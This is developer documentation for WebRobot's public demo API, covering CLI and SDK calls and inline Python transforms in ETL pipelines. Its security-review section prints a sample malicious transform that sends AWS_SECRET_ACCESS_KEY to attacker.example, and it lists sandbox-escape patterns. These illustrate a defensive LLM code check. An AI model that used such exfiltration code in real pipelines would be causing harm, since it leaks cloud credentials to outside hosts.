# Demo API & Developer Sandbox

The WebRobot platform ships a **public, no-auth demo plugin** designed as a real **developer sandbox**: build, run and inspect ETL pipelines on production infrastructure without registering an organization, paying, or installing anything beyond a single CLI or SDK.

The interactive UI at [/demo](/demo) is just one client of these endpoints — the same surface drives our CLI, all four official SDKs, and any tool you wire up against the OpenAPI spec. Treat `/webrobot/api/demo/*` as a stable contract you can prototype against and ship integration tests against.

### When this sandbox is the right tool

- **Try-before-you-buy.** Run a bundled pipeline end-to-end in 30 seconds to see what the output really looks like.
- **Pipeline prototyping.** Generate a pipeline from a natural-language prompt, iterate, then promote the same YAML to your own org without changing a single stage.
- **SDK integration.** Wire any of the four SDKs against the public endpoint and exercise `executeDemo` / `getExecutionStatus` / `getExecutionOutput` in your own CI before you have credentials.
- **Demo-driven onboarding.** Point a teammate at `webrobot demo execute …` and skip the API-key dance.
- **Extend without compiling.** Inject custom Python logic into a demo pipeline via inline `python_define` + `python_row_transform` — no Scala plugin, no bundle upload. See [Advanced: extending the demo pipeline with Python](#advanced-extending-the-demo-pipeline-with-python).

> **What "public" means here.** The `/webrobot/api/demo/*` endpoints accept anonymous calls. They are rate-limited and only schedule the pipelines whose YAML is bundled in the demo plugin (plus pipelines you produce with `generate-pipeline` + `save-generated-pipeline` in the same session). They run on a shared Spark cluster in Hetzner Helsinki (EU-sovereign), so output throughput is best-effort.

## Base URL

```
https://api.webrobot.eu/webrobot/api/demo
```

No `Authorization` header is required.  If you do send one (a real API key or JWT) the platform attributes usage to your org for analytics — useful but optional.

## Endpoint surface

The plugin exposes **25 operations**, grouped into five areas:

| Area | Endpoints |
| --- | --- |
| Run flow | `GET list`, `GET info`, `POST execute/{pipeline-name}`, `GET executions/{id}/status`, `GET executions/{id}/logs`, `GET executions/{id}/output`, `DELETE executions/{id}` |
| Pipeline generation | `POST generate-pipeline`, `POST save-generated-pipeline`, `POST reload-pipelines` |
| Dataset upload | `POST upload-dataset/{pipeline-name}` (multipart) |
| Catalog | `GET catalog/stages?search=` |
| Wizard | `POST wizard/cmf/{open,step}`, `DELETE wizard/cmf/{sessionId}`, `POST wizard/{suggest,infer-actions,infer-fields,infer-segment,infer-selector,suggest-field-names,validate}`, `GET wizard/proxy?url=&strategy=` |
| App assets | `GET app`, `GET app/{filename}` |

The OpenAPI definition is at <https://api.webrobot.eu/api/openapi.json> — search for paths starting with `/webrobot/api/demo/`.

---

## Quickest end-to-end: curl

```bash
# 1. list the demo pipelines bundled in the plugin
curl -s https://api.webrobot.eu/webrobot/api/demo/list | jq .

# 2. trigger one (returns { executionId, status, ... })
EXEC=$(curl -s -X POST -H 'Content-Type: application/json' -d '{}' \
  https://api.webrobot.eu/webrobot/api/demo/execute/01-static-books | jq -r .executionId)

# 3. poll status
curl -s "https://api.webrobot.eu/webrobot/api/demo/executions/$EXEC/status" | jq .

# 4. tail driver logs
curl -s "https://api.webrobot.eu/webrobot/api/demo/executions/$EXEC/logs?tail=200&podType=driver" | jq .

# 5. preview output rows once status=COMPLETED
curl -s "https://api.webrobot.eu/webrobot/api/demo/executions/$EXEC/output?limit=20" | jq .
```

`executionId` is the only state you need to carry between calls.

---

## With the CLI

The [WebRobot CLI](/docs/cli) ships a `webrobot demo` subcommand that mirrors every endpoint. It honours the same auth-optional posture: an empty `config.cfg` is enough.

```bash
# minimal config — no auth required for demo
cat > config.cfg <<EOF
api_endpoint=https://api.webrobot.eu
EOF
```

### Run a bundled pipeline end-to-end

```bash
webrobot demo list                       # see what's available
webrobot demo info                       # plugin build + runtime
webrobot demo execute 01-static-books --follow
# --follow polls status every 5 s and prints terminal state in colour

# inspect afterwards
webrobot demo status <executionId>
webrobot demo logs   <executionId> --tail 200
webrobot demo output <executionId> --limit 20
webrobot demo cancel <executionId>        # if still running
```

### Generate a pipeline from a prompt

```bash
webrobot demo generate-pipeline -b '{"prompt":"scrape books.toscrape.com — title, price, stock"}'
# pipe the response back to save it server-side
webrobot demo save-generated-pipeline -b @generated.json
webrobot demo reload-pipelines           # refresh the in-memory registry
```

### Upload an input CSV

```bash
webrobot demo upload-dataset 01-static-books --file ./seed.csv
```

### Browse the catalog

```bash
webrobot demo catalog-stages --search visit
```

### Wizard primitives

All `wizard-*` subcommands accept a free-form JSON body via `--body` (inline, `@file.json`, or path):

```bash
webrobot demo wizard-infer-fields -b '{"html":"<table>…</table>"}'
webrobot demo wizard-suggest      -b @context.json
webrobot demo wizard-proxy --url https://example.com --out page.html
```

---

## With the SDKs

All four official SDKs are regenerated from the OpenAPI spec and expose the demo operations under `DefaultApi`. The repos:

| Language | Repo | Install |
| --- | --- | --- |
| Python | [WebRobot-Ltd/webrobot-python-sdk](https://github.com/WebRobot-Ltd/webrobot-python-sdk) | `pip install webrobot` |
| TypeScript/Node | [WebRobot-Ltd/webrobot-nodejs-sdk](https://github.com/WebRobot-Ltd/webrobot-nodejs-sdk) | `npm i @webrobot/sdk` |
| PHP | [WebRobot-Ltd/sdks](https://github.com/WebRobot-Ltd/sdks) — `php-sdk/` | `composer require webrobot/sdk` |
| Go | [WebRobot-Ltd/sdks](https://github.com/WebRobot-Ltd/sdks) — `go-sdk/` | `go get github.com/WebRobot-Ltd/sdks/go-sdk` |

### Python

```python
import webrobot
from webrobot import ApiClient, Configuration
from webrobot.api.default_api import DefaultApi

cfg = Configuration(host="https://api.webrobot.eu")
api = DefaultApi(ApiClient(cfg))           # no auth — demo endpoints are public

print(api.list_demos())
resp = api.execute_demo(pipeline_name="01-static-books", request_body={})
exec_id = resp["executionId"]

print(api.get_execution_status(execution_id=exec_id))
print(api.get_execution_logs(execution_id=exec_id, tail=200))
print(api.get_execution_output(execution_id=exec_id, limit=20))
```

### TypeScript / Node.js

```ts
import { Configuration, DefaultApi } from '@webrobot/sdk'

const api = new DefaultApi(new Configuration({ basePath: 'https://api.webrobot.eu' }))

const pipelines = await api.listDemos()
const { executionId } = await api.executeDemo({ pipelineName: '01-static-books', requestBody: {} })

const status = await api.getExecutionStatus({ executionId })
const logs   = await api.getExecutionLogs({ executionId, tail: 200 })
const out    = await api.getExecutionOutput({ executionId, limit: 20 })
```

### PHP

```php
use WebRobot\Configuration;
use WebRobot\Api\DefaultApi;
use GuzzleHttp\Client;

$cfg = (new Configuration())->setHost('https://api.webrobot.eu');
$api = new DefaultApi(new Client(), $cfg);

$pipelines = $api->listDemos();
$resp      = $api->executeDemo('01-static-books', new \stdClass());
$execId    = $resp->executionId;
$status    = $api->getExecutionStatus($execId);
```

### Go

```go
import (
    webrobot "github.com/WebRobot-Ltd/sdks/go-sdk"
    "context"
)

cfg := webrobot.NewConfiguration()
cfg.Servers = webrobot.ServerConfigurations{{URL: "https://api.webrobot.eu"}}
api := webrobot.NewAPIClient(cfg)

pipelines, _, _ := api.DefaultAPI.ListDemos(context.Background()).Execute()
resp, _, _      := api.DefaultAPI.ExecuteDemo(context.Background(), "01-static-books").RequestBody(map[string]interface{}{}).Execute()
execID          := resp["executionId"].(string)
```

---

## Output shapes

All JSON responses are untyped (Jersey returns `Map<String, Object>`), but the demo plugin uses a stable contract:

```jsonc
// POST /execute/{pipeline-name}
{ "executionId": "ex_abc123", "status": "SUBMITTED", "pipelineName": "01-static-books" }

// GET /executions/{id}/status
{ "executionId": "ex_abc123", "status": "RUNNING" /* SUBMITTED | RUNNING | COMPLETED | FAILED | CANCELLED */ }

// GET /executions/{id}/output?limit=20
{
  "format": "csv" | "parquet" | "unknown",
  "columns": ["title", "price", ...],
  "rows":    [[...], [...]],
  "truncated": true,
  "note": "preview limited to first 20 rows"
}
```

`status` reaches `COMPLETED` (or `FAILED`/`CANCELLED`) when the Spark job finishes; only then does `output` return rows. The CLI's `--follow` flag wraps this polling loop automatically.

## Developer workflows

Treating the demo endpoints as a sandbox means you can build the whole iteration loop without ever touching auth or provisioning.

### Iterate on a generated pipeline

```bash
# 1. draft from a prompt
webrobot demo generate-pipeline \
  -b '{"prompt":"scrape books.toscrape.com — title, price, stock"}' \
  | tee draft.json

# 2. save server-side so you can run it like a bundled one
webrobot demo save-generated-pipeline -b @draft.json
webrobot demo reload-pipelines

# 3. run, follow, inspect — repeat
webrobot demo execute books-demo --follow
webrobot demo output  <executionId> --limit 50

# 4. when happy, export the YAML and promote to your own org
#    (the produced YAML is platform-portable; nothing in it is demo-specific)
```

### Treat it as a CI target for SDK changes

The demo endpoints make a viable CI smoke-test target — no secret to inject, no per-PR org to clean up. A useful pattern:

```yaml
# .github/workflows/sdk-smoke.yml (any SDK)
- run: |
    python -c "
    from webrobot import ApiClient, Configuration
    from webrobot.api.default_api import DefaultApi
    api = DefaultApi(ApiClient(Configuration(host='https://api.webrobot.eu')))
    assert any('01-static-books' in p for p in api.list_demos()['pipelines'])
    "
```

If `list_demos()` ever changes shape, your generator pipeline catches it the next time the spec is regenerated.

### Local SDK / CLI development

The CLI's `webrobot demo *` tree is the fastest way to validate a regenerated SDK or a new helper without spinning up an authenticated environment:

```bash
# point CLI at a locally-running stack
cat > config.cfg <<EOF
api_endpoint=http://localhost:8080
EOF

webrobot demo list                        # hits /webrobot/api/demo/list locally
webrobot demo execute 01-static-books --follow
```

Same commands, same JSON, no auth setup — useful when you're hacking on the Jersey plugin itself or on the openapi-generator templates.

### Going to production

Every demo path has a corresponding authenticated route on the main API:

| Demo (no auth)                                      | Production equivalent (your org)                                   |
| --------------------------------------------------- | ------------------------------------------------------------------ |
| `POST /webrobot/api/demo/execute/{pipeline-name}`   | `POST /webrobot/api/projects/{pid}/jobs/{jid}/execute`             |
| `GET  /webrobot/api/demo/executions/{id}/status`    | `GET  /webrobot/api/projects/{pid}/jobs/{jid}/executions/{id}/status` |
| `GET  /webrobot/api/demo/executions/{id}/output`    | `GET  /webrobot/api/datasets/{datasetId}/preview`                  |
| `POST /webrobot/api/demo/generate-pipeline`         | `POST /webrobot/api/wizard/generate-pipeline`                      |

The CLI follows the same parallel: `webrobot demo …` ↔ `webrobot project … / job … / execution …`. Switching is just a matter of pointing at the authenticated tree once you have credentials.

## Advanced: extending the demo pipeline with Python

You don't need to ship a Scala plugin — or upload a plugin bundle — to add custom logic to a demo pipeline. The ETL parser already accepts **Python Extensions** as a first-class stage, and they work end-to-end inside the demo sandbox: define a function in the YAML, reference it by name in a later stage, save and execute.

This is the right extensibility hook for sandbox users: no compile step, no `organization_id`, no deployment — just YAML plus a Python function that travels with the pipeline.

### How it wires

The parser supports a **top-level `python_extensions:` block** alongside `pipeline:`. The block declares one or more named functions; the pipeline then references them by name.

- **`python_extensions:`** — top-level YAML key (NOT a stage). Holds `stages: [{name, type, functionBody}]`. `functionBody` is just the body of the function, indented — the runtime wraps `def name(row): ...` around it before sending the code to the Spark executor.
- **`python_row_transform:<name>`** — pipeline stage that applies the named function row-by-row.

The function receives a row as a `dict` and returns a `dict`. Anything you want downstream must be in the returned dict (use `{**row, ...}` to preserve fields).

### End-to-end example

A demo pipeline that scrapes `books.toscrape.com`, then applies a custom Python transform to extract a clean numeric price:

```yaml
# books-with-extension.yaml — save-generated-pipeline accepts this directly

# ── extension declarations (top-level, NOT a stage) ──────────────────
python_extensions:
  stages:
    - name: clean_price
      type: row_transform
      functionBody: |
        import re
        raw = row.get('raw_price', '') or ''
        m = re.search(r'[\d.,]+', raw)
        price = float(m.group().replace(',', '.')) if m else None
        return {**row, 'price': price, 'currency': 'GBP'}

# ── pipeline references the named function by stage ─────────────────
pipeline:
  - stage: wget
    args: ["https://books.toscrape.com/"]

  - stage: extract
    args:
      - { name: title, selector: "article.product_pod h3 a", method: "attr:title" }
      - { name: raw_price, selector: "article.product_pod p.price_color", method: "text" }

  - stage: python_row_transform:clean_price
    args: []

output:
  format: csv
  mode: overwrite
  path: "${OUTPUT_CSV_PATH}"
```

A few things to keep in mind:

- `functionBody` is the **body only** — no `def` line, no signature. The Spark code generator (`PySparkCodeGenerator` → `pyspark_pipeline.mustache`) wraps `def {{name}}(row): ...` around it.
- The body is indented as you'd indent it inside a `def`. The first statement starts at column 0 of the literal block — the template injects the indent.
- `type: row_transform` is required; it tells the registry which kind of stage to register.
- Multiple functions live under `python_extensions.stages`; reference each one in the pipeline via `python_row_transform:<name>`.

Run it through the demo flow exactly like a bundled pipeline:

```bash
# 1. save the pipeline (any name; the demo plugin persists it for this session)
webrobot demo save-generated-pipeline -b @books-with-extension.yaml
webrobot demo reload-pipelines

# 2. execute and follow
webrobot demo execute books-with-extension --follow

# 3. inspect the output — note the new `price` and `currency` columns
webrobot demo output <executionId> --limit 20
```

The `clean_price` function ran on every row, added two columns, and the output preview reflects them. No plugin install, no Java build.

### AI-assisted: generate the function and the YAML in one shot

`python_define` is the sweet spot for AI code generation — the function source is small, the contract is fixed (`row: dict → dict`), and the whole thing ships inline so the model doesn't need to know anything about your infra. Two complementary patterns work here:

**1. Use the platform's own `generate-pipeline` endpoint.** Ask for the pipeline AND the transform together. The demo backend can emit both stages in the same YAML:

```bash
webrobot demo generate-pipeline -b '{
  "prompt": "Scrape books.toscrape.com and add a clean numeric `price` (GBP) column parsed from the raw price string. Include the python_define stage inline."
}' | tee draft.json

webrobot demo save-generated-pipeline -b @draft.json
webrobot demo reload-pipelines
webrobot demo execute books-with-extension --follow
```

The model is prompted to emit a complete `pipeline:` block that already references `python_row_transform:<name>` after the corresponding `python_define`.

**2. Use a coding agent (Claude Code, Cursor) against your editor.** Same prompt, just delivered to the IDE — the agent edits the YAML in place. Because the function is plain Python that satisfies a tiny contract, agents land it correctly on the first try almost every time. Just remember the rules the runtime enforces (stdlib-only, imports inside `def`, return a `dict`, preserve fields with `{**row, ...}`).

**3. Direct intent → named server skill → function snippet.** Between the two — when you don't need a whole pipeline (path 1) but don't want to round-trip through an IDE either (path 2) — call a **named wizard skill** that returns just the function body. The wizard endpoints follow a consistent contract: the client sends a small intent payload, the **system prompt and few-shot live server-side**, and the response is already shaped for the next stage.

The relevant skills:

| Skill | Endpoint | Input | Output |
| --- | --- | --- | --- |
| Stages from intent | `POST /webrobot/api/demo/wizard/suggest` | `{"intent":"..."}` | `{"suggested":["wget","wgetExplore",...]}` |
| Python transform from intent | `POST /webrobot/api/demo/wizard/generate-python-transform` | `{"intent":"...","sampleRow":{...}}` (sampleRow optional) | `{"name":"clean_price","type":"row_transform","functionBody":"import re\n...","valid":true,"security":{"safe":true,"severity":"none"}}` |
| Validate a Python transform (contract) | `POST /webrobot/api/demo/wizard/validate-python-transform` | `{"functionBody":"..."}` (or legacy `{"code":"def ..."}`) | `{"ok":true,"name":"clean_price"}` or `{"ok":false,"issues":[...]}` |
| Security-check a Python transform (LLM) | `POST /webrobot/api/demo/wizard/security-check-python-transform` | `{"functionBody":"..."}` (or legacy `{"code":"def ..."}`) | `{"safe":bool,"severity":"none\|low\|medium\|high\|critical","risks":[...],"summary":"..."}` |

The benefit of named skills over raw LLM calls: every client (CLI, demo UI, your own integration) hits the same system prompt and the same output shape — drift between callers is impossible, and the platform owners can iterate the prompt without breaking every consumer.

```bash
# ask the server to generate the function — no system prompt on the client
curl -s -X POST https://api.webrobot.eu/webrobot/api/demo/wizard/generate-python-transform \
  -H 'Content-Type: application/json' \
  -d '{
    "intent": "Parse raw_price (any common European/UK format) into numeric `price`; add `currency` with detected ISO code.",
    "sampleRow": {"raw_price": "£12.99"}
  }' | jq .

# → { "name": "clean_price", "type": "row_transform",
#     "functionBody": "import re\nraw = row.get('raw_price', '') or ''\n..." }
```

Drop the returned `functionBody` straight into a `python_extensions.stages` entry:

```yaml
python_extensions:
  stages:
    - name: clean_price
      type: row_transform
      functionBody: |
        # ← paste the `functionBody` field returned by /wizard/generate-python-transform

pipeline:
  - stage: python_row_transform:clean_price
    args: []
```

This is also the natural shape for an "intent box" widget next to the YAML editor in the demo UI: a textarea, a "generate" button, and the same endpoint. No system prompt in the client, no divergence.

The three paths converge on the same YAML, so you can mix freely — e.g. let the platform generate the scraping stages (path 1), refine the transform via the named skill (path 3), and polish edge cases by hand in the IDE (path 2). The contract that backs them all is one place: the wizard skills on the server.

### Security review of submitted Python

Hand-written code (path 2) and code copied off the internet need a second pair of eyes. The platform exposes an **LLM-based security review** that complements the static contract check — same shape, different question:

| Check | What it looks for | When it runs |
| --- | --- | --- |
| `validate-python-transform` | Contract: one top-level `def NAME(row):`, no top-level imports, no obvious I/O, returns something | Static, deterministic, fast |
| `security-check-python-transform` | Sandbox-escape patterns: `os.environ`, `__import__`, reflection via `__class__.__bases__`, hidden `subprocess`/`socket`/`eval`, base64-decoded payloads, etc. | LLM-based, slower (~1–2 s), catches what regex can't |

Recommended flow before saving a pipeline with custom Python:

```bash
# 1. static contract — pass either `functionBody` (canonical) or `code` (legacy)
curl -s -X POST https://api.webrobot.eu/webrobot/api/demo/wizard/validate-python-transform \
  -H 'Content-Type: application/json' \
  -d "$(jq -n --arg b "$BODY" '{functionBody:$b}')" | jq .

# 2. LLM security review — fail closed on `safe:false`
curl -s -X POST https://api.webrobot.eu/webrobot/api/demo/wizard/security-check-python-transform \
  -H 'Content-Type: application/json' \
  -d "$(jq -n --arg b "$BODY" '{functionBody:$b}')" | jq .
```

A malicious `functionBody` that tries to exfiltrate env vars (remember: the runtime wraps `def name(row):` around this body):

```python
import os, urllib.request
# exfiltrate the executor's secrets to attacker-controlled host
urllib.request.urlopen('https://attacker.example/' + os.environ.get('AWS_SECRET_ACCESS_KEY', ''))
return {**row, 'price': 0.0}
```

→ response:
```json
{
  "safe": false,
  "severity": "critical",
  "risks": [
    {"category": "env-exfiltration", "explanation": "Reads AWS_SECRET_ACCESS_KEY from os.environ", "snippet": "os.environ.get('AWS_SECRET_ACCESS_KEY', '')"},
    {"category": "network",          "explanation": "urllib.request.urlopen to attacker-controlled host", "snippet": "urllib.request.urlopen('https://attacker.example/...')"}
  ],
  "summary": "Reads AWS secret from env and POSTs it to an external host."
}
```

The `generate-python-transform` endpoint runs this check automatically on its own output — the response includes a `security` field alongside `code` and `valid`. For code that didn't come from the generator (path 2 in the IDE), call the security endpoint explicitly before `save-generated-pipeline`.

**Defense in depth, not the only line.** The executor itself is still the authoritative sandbox — stdlib-only, no globals, isolated namespace. The LLM review just keeps obviously hostile code out of the queue before Spark is even scheduled, which protects the shared demo cluster and keeps the audit trail clean.

### When to use which mode

The full [Python Extensions](/docs/python-extensions) page covers three modes — here is when each makes sense:

| Mode | Where the code lives | Fit for demo sandbox? |
| --- | --- | --- |
| **A — Inline `python_define`** | In the pipeline YAML itself | ✅ **Use this in the demo.** Self-contained, no auth needed, travels with the pipeline. |
| **B — DB-registered** | `POST /api/python-extensions` (needs `organization_id`) | ❌ Requires an authenticated org. Move to this once you've got credentials and want to share functions across pipelines. |
| **C — Hybrid (AI-assisted)** | AI agent generates + registers + references | ❌ Same auth requirement as Mode B. |

So the path is: **prototype with Mode A in the sandbox → promote to Mode B once you've got an org**. The YAML stays portable in both cases — only the function source moves from inline to DB.

### What the parser supports today

The ETL parser handles these on the same pipeline:

- multiple `python_define` blocks (define helpers before they are used)
- chained `python_row_transform:<name>` calls in any order
- a function returning a dict with a `__drop__: true` marker to filter rows
- standard library imports inside the function body (do imports *inside* `def`, not at the top of the snippet)

What it does **not** support inside the inline mode:

- third-party pip packages — only the Python stdlib is available in the sandboxed executor for demo pipelines. If you need pandas/lxml/etc., promote to Mode B in your own org where you control the executor image.
- multi-row aggregations — `python_row_transform` is strictly row-by-row. For windowed/aggregate logic, use `groupby` or `aggregate` stages instead.

See [Python Extensions → Function Contract](/docs/python-extensions#function-contract) for the full rule set.

## Notes on limits

- The shared demo cluster runs a single Spark driver pod per execution — concurrency is bounded.
- `intelligentExplore`/`wgetExplore`/`visitExplore` stages in demo pipelines are capped at depth ≤ 1 to protect the shared LLM key. If you need deeper crawls, generate a pipeline and run it under your own org.
- Output files are kept in MinIO for ~24 h, then garbage-collected. Save what you need.

## Going further

Once you've tried the demo, the same flow with your own pipelines and credentials lives under `/webrobot/api/projects/...`, `/webrobot/api/jobs/...`, etc. See:

- [Quick Start](/docs/quick-start) — your first authenticated pipeline
- [CLI Reference](/docs/cli) — full command tree
- [Pipeline Stages](/docs/pipeline-stages) — what stages are available
- [Authentication](/api/authentication) — API keys and JWTs for the non-demo surface
